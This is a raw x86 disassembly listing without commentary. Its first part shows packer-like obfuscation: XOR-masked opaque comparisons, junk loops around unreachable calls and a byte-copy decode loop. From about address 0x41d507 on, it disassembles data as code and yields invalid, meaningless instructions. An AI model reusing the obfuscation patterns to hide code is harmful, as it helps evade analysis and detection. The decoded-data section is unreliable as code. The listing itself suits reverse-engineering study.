  41d166:	mov    ecx,0x8a29a147
  41d16b:	xor    edx,ecx
  41d16d:	mov    DWORD PTR [esp+0x28],edx
  41d171:	mov    edx,DWORD PTR [esp+0x3c]
  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427c91
  41d28a:	mov    ecx,DWORD PTR ds:0x429d55
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x430a2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x430a38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x430a3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [esi+0x5e],bl
  41d515:	adc    dh,cl
  41d517:	(bad)  
  41d518:	(bad)  
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2-0x3e10ea85],1
  41d522:	jmp    0x41d4a8
  41d524:	je     0x41d560
  41d526:	mov    esi,0x376a33d6
  41d52b:	mov    gs,ebx
  41d52d:	dec    esi
  41d52e:	jbe    0x41d512
  41d530:	call   0xe5cf:0x1ce53c97
  41d537:	jnp    0x41d594
  41d539:	xlat   BYTE PTR ds:[ebx]
  41d53a:	sahf   
  41d53b:	les    ecx,FWORD PTR [eax+0x66fe86f]
  41d541:	dec    ebp
  41d542:	sbb    ecx,DWORD PTR [esi-0x5e]
  41d545:	cmp    ebx,DWORD PTR [ebx-0x3]
  41d548:	dec    ebx
  41d549:	mov    edx,0xa0c84076
  41d54e:	xchg   esp,eax
  41d54f:	jl     0x41d5c7
  41d551:	fmul   DWORD PTR [ebx]
  41d553:	inc    edx
  41d554:	call   0xa52c:0x89c48e1e
  41d55b:	(bad)  
  41d55c:	cmp    dl,BYTE PTR [eax]
  41d55e:	pusha  
  41d55f:	mov    bh,dl
  41d561:	fldcw  WORD PTR [esi]
  41d563:	jb     0x41d529
  41d565:	mov    al,0x40
  41d567:	repnz cmp ecx,DWORD PTR [ecx]
  41d56a:	jg     0x41d53c
  41d56c:	mov    edi,0x2ad26fcf
  41d571:	sbb    ah,dh
  41d573:	in     eax,dx
  41d574:	hlt    
  41d575:	fld    QWORD PTR [ebp-0x4b]
  41d578:	fmulp  st(2),st
  41d57a:	out    dx,eax
  41d57b:	mov    BYTE PTR [ebx],bh
  41d57d:	inc    ebx
  41d57e:	mov    al,0x49
  41d580:	cld    
  41d581:	xchg   edx,eax
  41d582:	jae    0x41d581
  41d584:	pop    eax
  41d585:	int    0xb0
  41d587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d588:	mov    ebx,0x467772be
  41d58d:	jne    0x41d5aa
  41d58f:	mov    WORD PTR [ebx+eiz*8+0x44e8aa0b],?
  41d596:	sbb    cx,WORD PTR [ebx+0x2]
  41d59a:	test   eax,0x8f9a1917
  41d59f:	fadd   st(3),st
  41d5a1:	jns    0x41d553
  41d5a3:	repz cmp BYTE PTR [ebp+ebx*8+0x37],0x60
  41d5a9:	sti    
  41d5aa:	mul    DWORD PTR [esi+0x12]
  41d5ad:	mov    dh,0xb5
  41d5af:	lahf   
  41d5b0:	(bad)  
  41d5b1:	popf   
  41d5b2:	jo     0x41d551
  41d5b4:	enter  0x5968,0x6
  41d5b8:	sub    DWORD PTR [eax],edi
  41d5ba:	dec    edx
  41d5bb:	pusha  
  41d5bc:	in     eax,0xaa
  41d5be:	or     al,0xd9
  41d5c0:	outs   dx,DWORD PTR ds:[esi]
  41d5c1:	sti    
  41d5c2:	inc    esi
  41d5c3:	in     al,dx
  41d5c4:	adc    edx,esp
  41d5c6:	jae    0x41d5c8
  41d5c8:	xchg   DWORD PTR [ebx],esi
  41d5ca:	aaa    
  41d5cb:	mov    DWORD PTR [edx+ecx*4],esi
  41d5ce:	push   es
  41d5cf:	dec    DWORD PTR [eax]
  41d5d1:	adc    ah,bl
  41d5d3:	dec    ebp
  41d5d4:	in     eax,dx
  41d5d5:	imul   eax,DWORD PTR [edx-0x258f686f],0x63
  41d5dc:	in     al,0x47
  41d5de:	sbb    eax,0x2c14b708
  41d5e3:	(bad)  
  41d5e4:	ja     0x41d567
  41d5e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5e7:	xchg   esp,ecx
  41d5e9:	mov    bl,0xfa
  41d5eb:	(bad)  
  41d5ec:	mov    DWORD PTR [edx-0x49],esp
  41d5ef:	jae    0x41d5c4
  41d5f1:	jne    0x41d579
  41d5f3:	mov    edx,0xede27f4f
  41d5f8:	mov    ebp,0x1d1e8112
  41d5fd:	test   al,0x6f
  41d5ff:	ins    BYTE PTR es:[edi],dx
  41d600:	xchg   ebx,eax
  41d601:	jb     0x41d5f3
  41d603:	lods   al,BYTE PTR ds:[esi]
  41d604:	rcl    BYTE PTR [edi+0x3e],cl
  41d607:	test   BYTE PTR [edx-0x6f],ah
  41d60a:	fisttp QWORD PTR [edi+0x3e6dfa97]
  41d610:	inc    ebx
  41d611:	loop   0x41d669
  41d613:	jo     0x41d5bc
  41d615:	cmp    ah,BYTE PTR [edx+ebx*2+0x4687f0cc]
  41d61c:	stos   BYTE PTR es:[edi],al
  41d61d:	or     ch,BYTE PTR [bp+di+0x3c]
  41d621:	cld    
  41d622:	imul   ecx,esi,0x43f5a1bb
  41d628:	sub    esp,eax
  41d62a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d62b:	xchg   BYTE PTR [ebp-0x49],cl
  41d62e:	into   
  41d62f:	out    0xbb,al
  41d631:	fwait
  41d632:	jge    0x41d5d6
  41d634:	shl    DWORD PTR [eax-0x27],0x26
  41d638:	mov    ch,0x4c
  41d63a:	push   eax
  41d63b:	(bad)  
  41d63c:	ret    
  41d63d:	cmp    eax,0x7199b134
  41d642:	xchg   edi,eax
  41d643:	sti    
  41d644:	sub    al,0x4c
  41d646:	add    bl,BYTE PTR [ecx-0x56]
  41d649:	sbb    al,0xc7
  41d64b:	(bad)  
  41d64c:	jge    0x41d692
  41d64e:	into   
  41d64f:	mov    edx,0xe891500a
  41d654:	jp     0x41d647
  41d656:	mov    eax,ds:0x62dd36fd
  41d65b:	rcr    BYTE PTR [esi+edi*1],cl
  41d65e:	rcl    ch,cl
  41d660:	in     al,0xa0
  41d662:	add    al,0xff
  41d664:	xlat   BYTE PTR ds:[ebx]
  41d665:	xchg   ecx,eax
  41d666:	mov    dl,0xe7
  41d668:	cmp    eax,0x666809c7
  41d66d:	fldenv ds:0x87df93a6
  41d673:	outs   dx,DWORD PTR ds:[esi]
  41d674:	push   ebx
  41d675:	xor    DWORD PTR [eax-0x55],edi
  41d678:	xor    eax,DWORD PTR [esi+0x789881e7]
  41d67e:	cmp    al,0x9e
  41d680:	imul   ebp,DWORD PTR [esi],0xfdec9967
  41d686:	inc    ecx
  41d687:	mov    esp,0x91b52f00
  41d68c:	xchg   edx,eax
  41d68d:	frstor [edi+0x897c525]
  41d693:	aas    
  41d694:	cmp    al,0x51
  41d696:	icebp  
  41d697:	inc    ebp
  41d698:	add    BYTE PTR [edx],ah
  41d69a:	mov    edi,DWORD PTR ds:[ecx]
  41d69d:	test   al,0x43
  41d69f:	data16 and al,0xa2
  41d6a2:	addr16 dec ebx
  41d6a4:	out    dx,eax
  41d6a5:	xor    DWORD PTR [edx-0x197f5c4c],eax
  41d6ab:	sbb    DWORD PTR [ecx+0x11a74e67],esp
  41d6b1:	int    0xdc
  41d6b3:	add    DWORD PTR [eax+0x2d28a65f],ecx
  41d6b9:	dec    ebx
  41d6ba:	jo     0x41d6d7
  41d6bc:	imul   ebp,DWORD PTR [ebx+0x5],0xfffffff4
  41d6c0:	and    ecx,DWORD PTR [ebx+ebp*8-0x6fb9b97a]
  41d6c7:	fild   WORD PTR [edx-0x4b]
  41d6ca:	jecxz  0x41d6fa
  41d6cc:	mov    bh,cl
  41d6ce:	mov    edx,0xe8044190
  41d6d3:	mov    esp,0x9ccd0448
  41d6d8:	jbe    0x41d6e2
  41d6da:	iret   
  41d6db:	test   BYTE PTR [esi+0x6eb4ce3],al
  41d6e1:	lock pslld mm0,QWORD PTR [eax]
  41d6e5:	mov    bl,0x4b
  41d6e7:	out    dx,al
  41d6e8:	push   eax
  41d6e9:	adc    DWORD PTR [ebx+0x5959f20b],edx
  41d6ef:	call   0x2b9:0xb6d0ffe4
  41d6f6:	xchg   DWORD PTR [edi-0x64],ecx
  41d6f9:	add    al,bl
  41d6fb:	xchg   ebp,eax
  41d6fc:	mov    ebp,0x92d5764b
  41d701:	pop    ebp
  41d702:	repnz test BYTE PTR [ecx+0x3f],bl
  41d706:	inc    ebx
  41d707:	sbb    eax,0x68c07c1a
  41d70c:	push   edi
  41d70d:	cmp    ecx,ebx
  41d70f:	stc    
  41d710:	mov    esp,0xd8c018c3
  41d715:	push   edx
  41d716:	dec    ebx
  41d717:	push   ds
  41d718:	add    al,0x95
  41d71a:	popa   
  41d71b:	inc    esi
  41d71c:	popa   
  41d71d:	inc    edx
  41d71e:	call   0x9b1c:0x36c64ba9
  41d725:	pop    es
  41d726:	pop    es
  41d727:	inc    ecx
  41d728:	pop    edx
  41d729:	jmp    0x5755:0xbaf1bee6
  41d730:	jns    0x41d763
  41d732:	xchg   edx,eax
  41d733:	cmp    al,0xb6
  41d735:	rcr    DWORD PTR [ecx+edi*4+0x7f99d404],1
  41d73c:	sub    eax,0xf3a6416d
  41d741:	push   es
  41d742:	cmc    
  41d743:	imul   eax,edx,0x66727cce
  41d749:	mov    eax,ds:0x4adb41d5
  41d74e:	and    BYTE PTR [eax+ebp*4-0x666a3e02],ch
  41d755:	dec    ebx
  41d756:	stos   DWORD PTR es:[edi],eax
  41d757:	mov    bh,0x39
  41d759:	push   ss
  41d75a:	clc    
  41d75b:	xchg   BYTE PTR [edx-0x20adbf0a],dh
  41d761:	test   eax,0xb0824a05
  41d766:	push   0x5fc0c95a
  41d76b:	cmp    BYTE PTR [ecx+0x66],ah
  41d76e:	push   0x41
  41d770:	xor    BYTE PTR [ecx+ecx*2+0x49],bl
  41d774:	leave  
  41d775:	adc    al,BYTE PTR [esi]
  41d777:	jg     0x41d726
  41d779:	cmp    DWORD PTR [ecx+0x64],edi
  41d77c:	inc    edx
  41d77d:	outs   dx,BYTE PTR ds:[esi]
  41d77e:	test   al,0xd5
  41d780:	test   al,0xe
  41d782:	arpl   WORD PTR [edi+0x7],dx
  41d785:	test   DWORD PTR [edx+0x3891001c],esp
  41d78b:	test   eax,0xd0aebaf8
  41d790:	test   DWORD PTR [ebp-0x1d350fd2],ebp
  41d796:	rol    esi,cl
  41d798:	xchg   ebp,eax
  41d799:	mov    cs,WORD PTR [edx+0x102467aa]
  41d79f:	popa   
  41d7a0:	std    
  41d7a1:	push   ss
  41d7a2:	or     eax,0x6093eab7
  41d7a7:	jecxz  0x41d822
  41d7a9:	and    bl,BYTE PTR [ebx]
  41d7ab:	mov    edx,0x9b02c759
  41d7b0:	mov    dl,BYTE PTR [eax+0x44e8e921]
  41d7b6:	xor    eax,0x4251147d
  41d7bb:	jecxz  0x41d745
  41d7bd:	mov    WORD PTR [ecx],ds
  41d7bf:	daa    
  41d7c0:	cmp    ecx,ebp
  41d7c2:	inc    esi
  41d7c3:	mov    dl,0x3a
  41d7c5:	retf   0xdce
  41d7c8:	adc    ecx,esi
  41d7ca:	mov    cl,0x34
  41d7cc:	adc    esp,edx
  41d7ce:	jae    0x41d821
  41d7d0:	xchg   ebx,eax
  41d7d1:	pop    ecx
  41d7d2:	fcomip st,st(1)
  41d7d4:	retf   0xeb8b
  41d7d7:	std    
  41d7d8:	xchg   esi,eax
  41d7d9:	ret    
  41d7da:	sbb    DWORD PTR [edx],0xffffffa4
  41d7dd:	jbe    0x41d774
  41d7df:	mov    edi,0xfeb1e919
  41d7e4:	or     eax,0x204edfad
  41d7e9:	mov    ebx,0x22de40a7
  41d7ee:	fadd   QWORD PTR [ecx]
  41d7f0:	and    ebx,DWORD PTR ds:0x9b9d4c80
  41d7f6:	rcr    DWORD PTR [ecx+0x2fb7addb],1
  41d7fc:	mov    eax,ds:0xc6c96b23
  41d801:	cdq    
  41d802:	aad    0xea
  41d804:	pop    ebp
  41d805:	push   es
  41d806:	jne    0x41d840
  41d808:	sbb    al,0x30
  41d80a:	stos   DWORD PTR es:[edi],eax
  41d80b:	jg     0x41d82b
  41d80d:	add    esp,DWORD PTR [ebx-0x35]
  41d810:	push   cs
  41d811:	int3   
  41d812:	or     BYTE PTR [ebx],al
  41d814:	test   BYTE PTR [edx],dl
  41d816:	xchg   esi,eax
  41d817:	mov    ds:0x6ee6bfd0,eax
  41d81c:	jae    0x41d833
  41d81e:	mov    eax,ds:0x508bc39b
  41d823:	fnsave [edx-0x57]
  41d826:	js     0x41d84d
  41d828:	or     DWORD PTR [ebx+0x43],esp
  41d82b:	push   esp
  41d82c:	pop    esi
  41d82d:	jo     0x41d8a1
  41d82f:	pop    ecx
  41d830:	push   eax
  41d831:	mov    ah,0xb5
  41d833:	loopne 0x41d854
  41d835:	bound  ebx,QWORD PTR [ebx-0x11]
  41d838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d839:	mov    dh,0x54
  41d83b:	pop    ds
  41d83c:	or     eax,0xd3c7d091
  41d841:	cmp    esp,DWORD PTR [esi+eiz*4+0x12873025]
  41d848:	dec    edi
  41d849:	jno    0x41d886
  41d84b:	ror    BYTE PTR [esi-0x5c],cl
  41d84e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d84f:	fidivr DWORD PTR [eax+0x55ad61b]
  41d855:	in     al,0xee
  41d857:	mov    DWORD PTR [esi+0x39],0xd6ae4db6
  41d85e:	and    ecx,DWORD PTR [edx]
  41d860:	rcr    DWORD PTR [edx-0x3c],0x15
  41d864:	das    
  41d865:	cmp    dl,BYTE PTR [edi]
  41d867:	dec    DWORD PTR ds:0x12f4c8b1
  41d86d:	mov    ds:0x2a3181a5,eax
  41d872:	or     DWORD PTR [esi+edi*8],edi
  41d875:	js     0x41d88a
  41d877:	in     al,dx
  41d878:	das    
  41d879:	xchg   esi,eax
  41d87a:	cmp    BYTE PTR [eax+0x45],al
  41d87d:	fst    st(4)
  41d87f:	sub    BYTE PTR [esi],bh
  41d881:	into   
  41d882:	iret   
  41d883:	xchg   ebp,eax
  41d884:	cs adc eax,0x4e93e4ad
  41d88a:	jnp    0x41d87b
  41d88c:	ja     0x41d8c9
  41d88e:	add    al,0x40
  41d890:	mov    bh,0x58
  41d892:	push   edi
  41d893:	cmc    
  41d894:	sub    BYTE PTR [edx-0x47b00abb],al
  41d89a:	jns    0x41d890
  41d89c:	loopne 0x41d829
  41d89e:	jl     0x41d8b1
  41d8a0:	add    si,di
  41d8a3:	popa   
  41d8a4:	fmul   QWORD PTR ds:0x103f0c8e
  41d8aa:	sti    
  41d8ab:	sub    al,0x3
  41d8ad:	adc    DWORD PTR [ebx],0x9c527cf9
  41d8b3:	pop    ebp
  41d8b4:	pop    esp
  41d8b5:	pop    ecx
  41d8b6:	jns    0x41d8d7
  41d8b8:	mov    bh,0xa
  41d8ba:	jle    0x41d8da
  41d8bc:	cmc    
  41d8bd:	popf   
  41d8be:	push   edx
  41d8bf:	mov    edi,0xc483f3be
  41d8c4:	aad    0x75
  41d8c6:	mov    edi,0x62ece834
  41d8cb:	in     al,0x7e
  41d8cd:	pop    ds
  41d8ce:	mov    ebx,0x7b61c05a
  41d8d3:	sahf   
  41d8d4:	jb     0x41d923
  41d8d6:	jae    0x41d895
  41d8d8:	in     eax,dx
  41d8d9:	in     eax,0x8f
  41d8db:	mov    ebp,0x3c8d7519
  41d8e0:	cmc    
  41d8e1:	pusha  
  41d8e2:	sbb    ebp,DWORD PTR ds:0xd4b575ce
  41d8e8:	mov    bl,0xfd
  41d8ea:	xor    al,0xea
  41d8ec:	hlt    
  41d8ed:	popa   
  41d8ee:	cld    
  41d8ef:	sub    BYTE PTR [esi+0x73],0xbf
  41d8f3:	lods   eax,DWORD PTR ds:[esi]
  41d8f4:	(bad)  
  41d8f5:	popa   
  41d8f6:	dec    ebp
  41d8f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8f8:	dec    ecx
  41d8f9:	adc    al,0x83
  41d8fb:	push   ds
  41d8fc:	mov    BYTE PTR [ecx+edi*8-0xe1f8ce6],ch
  41d903:	retf   
  41d904:	inc    eax
  41d905:	out    dx,al
  41d906:	scas   eax,DWORD PTR es:[edi]
  41d907:	in     eax,dx
  41d908:	(bad)  
  41d909:	int3   
  41d90a:	in     eax,dx
  41d90b:	mov    ds:0x32a7d1e3,al
  41d910:	(bad)  
  41d911:	pop    ebp
  41d912:	or     ecx,DWORD PTR [eax+0xb]
  41d915:	jle    0x41d943
  41d917:	es jmp 0xa9653609
  41d91d:	je     0x41d8f0
  41d91f:	test   al,0x4e
  41d921:	daa    
  41d922:	mov    eax,edi
  41d924:	fldenv [eax+0xc]
  41d927:	cli    
  41d928:	cmp    eax,0x546ddc60
  41d92d:	(bad)  
  41d92f:	xor    eax,0xad2708f8
  41d934:	syscall 
  41d936:	inc    edi
  41d937:	xor    bh,BYTE PTR [edi+0x47]
  41d93a:	mov    cl,0x81
  41d93c:	sub    ah,bl
  41d93e:	pop    es
  41d93f:	out    dx,al
  41d940:	push   esp
  41d941:	pop    ebx
  41d942:	and    eax,0x69de0239
  41d947:	scas   al,BYTE PTR es:[edi]
  41d948:	mov    edx,ebp
  41d94a:	lea    esi,[edi-0x5a097417]
  41d950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d951:	call   0x5785:0xee4571d9
  41d958:	or     edx,edi
  41d95a:	out    dx,al
  41d95b:	sbb    DWORD PTR [ebp-0x2],ebx
  41d95e:	pop    ecx
  41d95f:	pop    edx
  41d960:	jecxz  0x41d9a1
  41d962:	imul   esi,DWORD PTR [ecx+0x76a3b4d0],0x7688013c
  41d96c:	xchg   BYTE PTR [esi+eax*4-0x1c4fe86],bl
  41d973:	pop    ds
  41d974:	mov    bl,0x98
  41d976:	mov    ds:0x2379b86d,al
  41d97b:	adc    eax,0x2867650
  41d980:	jo     0x41d93d
  41d982:	into   
  41d983:	jns    0x41d973
  41d985:	push   ecx
  41d986:	fdivr  DWORD PTR [edx]
  41d988:	imul   DWORD PTR [ebx+0x1ba0e689]
  41d98e:	mov    dh,0xdd
  41d990:	cmp    al,dh
  41d992:	(bad)  
  41d993:	out    0x64,al
  41d995:	js     0x41d9f2
  41d997:	addr16 fsub st(5),st
  41d99a:	mov    ebx,0x1208199f
  41d9a0:	sar    DWORD PTR [eax+0x72],1
  41d9a3:	pop    es
  41d9a4:	and    BYTE PTR [edx+0x5d],0xf7
  41d9a8:	sub    eax,eax
  41d9aa:	sar    BYTE PTR [esi],1
  41d9ac:	xor    eax,0xd4dbe741
  41d9b1:	stos   DWORD PTR es:[edi],eax
  41d9b2:	jbe    0x41d97c
  41d9b4:	repnz call 0x180a:0x634628e3
  41d9bc:	sbb    DWORD PTR [edx],esi
  41d9be:	dec    esp
  41d9bf:	ins    DWORD PTR es:[edi],dx
  41d9c0:	test   DWORD PTR [ebp+edx*4+0x7c],0x9e3c9d57
  41d9c8:	pushf  
  41d9c9:	scas   al,BYTE PTR es:[edi]
  41d9ca:	dec    edi
  41d9cb:	mov    ecx,0x9cf2decb
  41d9d0:	les    esp,FWORD PTR [edx+eax*4+0x5d47fb69]
  41d9d7:	dec    esp
  41d9d8:	push   edx
  41d9d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9da:	cmp    DWORD PTR [ebx+0x3d],eax
  41d9dd:	mov    dh,0x5
  41d9df:	outs   dx,BYTE PTR ds:[esi]
  41d9e0:	push   es
  41d9e1:	inc    edi
  41d9e2:	mov    bh,0xc
  41d9e4:	mov    DWORD PTR [esi+0x1],ebp
  41d9e7:	(bad)  
  41d9e8:	jl     0x41d983
  41d9ea:	js     0x41d98a
  41d9ec:	test   DWORD PTR [eax],esi
  41d9ee:	mov    ecx,0xc5216f44
  41d9f3:	inc    ecx
  41d9f4:	inc    ebx
  41d9f6:	inc    eax
  41d9f7:	cmp    al,0xa4
  41d9f9:	inc    esp
  41d9fa:	jp     0x41da4e
  41d9fc:	das    
  41d9fd:	mov    ds:0x6946a058,eax
  41da02:	loope  0x41da37
  41da04:	add    al,0x86
  41da06:	add    al,0xa0
